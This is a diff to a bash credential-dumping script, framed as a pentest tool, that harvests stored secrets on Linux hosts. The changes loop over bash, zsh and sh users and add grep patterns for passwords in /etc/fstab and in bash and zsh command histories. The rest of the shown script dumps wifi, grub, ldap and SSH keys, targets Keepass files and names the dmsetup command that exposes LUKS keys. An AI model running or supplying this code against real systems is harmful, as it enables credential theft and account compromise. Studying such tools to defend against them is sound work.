@@ -1,7 +1,7 @@
 #! /bin/bash
 # If there is a will, there is a way
 #                        0xMitsurugi
-# v0.0.3
+# v0.0.4
 
 ############## Credz dumper ##############################
 # This script will try to grab all stored password/secrets
@@ -27,7 +27,7 @@ _grep_file() {
 	pattern="$3"
 	ROOT=$(_check_root)
 	if [ $ROOT == "yes" ]; then
-        	for userhome in $(grep /bin/bash /etc/passwd | cut -d ":" -f6 )
+		for userhome in $(grep -E "/bin/(ba|z)?sh" /etc/passwd | cut -d ":" -f6 )
 		        do
 			        _grep_file_user "$name" "$userhome" "$file" "$pattern"
 			done
@@ -164,8 +164,8 @@ _dump_firefox_user() {
 _loop_users() {
 	#$1 is the name of the function
 	if [ $(_check_root) == "yes" ]; then
-		#Is it a good check? user with bash shell?
-		for userhome in $(grep /bin/bash /etc/passwd | cut -d ":" -f6 )
+		#We loop through user who have a shell bash, zsh or sh
+		for userhome in $(grep -E "/bin/(ba|z)?sh" /etc/passwd | cut -d ":" -f6 )
 		do
 			$1 "$userhome"
 		done
@@ -350,11 +350,9 @@ _print_win() {
 	#$1 : file containing secret
 	#$2 : secret
 	echo ${GREEN}"[+] GOT ONE!!"${RESTORE}
-	#realpath would provide good path, but fail because $1 is not always a file.
 	echo ${LBLUE}"File: "${RESTORE} $(realpath "$1")
-	#echo ${LBLUE}"File: "${RESTORE} "$1"
 	echo "$2"
-
+	#This is the place to save file for a future use
 }
 
 _print_lose() {
@@ -402,6 +400,7 @@ if [ $(_check_root) == "yes" ]; then
 	_dump_wifi_wpa_supplicant
 	_dump_grub
 	_dump_ldap
+	_grep_file_user "Password in fstab" "/etc" "fstab" " -E [^<]pass"
 	#Should we dump LUKS key? For what usage if we are in pentest?
 	# in case you need it -> dmsetup table --showkeys crypto
 fi
@@ -416,6 +415,9 @@ _grep_file "pidgin (libpurple)" ".purple/accounts.xml" "-B1 password"
 _grep_file "postgreSQL" ".pgpass" ":"
 _grep_file "mysql pass in CLI history" ".bash_history" "-E mysql.*-p"
 _grep_file "rdesktop pass in CLI history" ".bash_history" "-E rdesktop.*-p "
+_grep_file "password switch found in history" ".bash_history" "-- "--password""
+_grep_file "mysql pass in CLI history" ".zsh_history" "-E mysql.*-p"
+_grep_file "rdesktop pass in CLI history" ".zsh_history" "-E rdesktop.*-p "
 #Always interesting to look there
 _loop_users _dump_ssh_keys
 #Keepass database are good targets
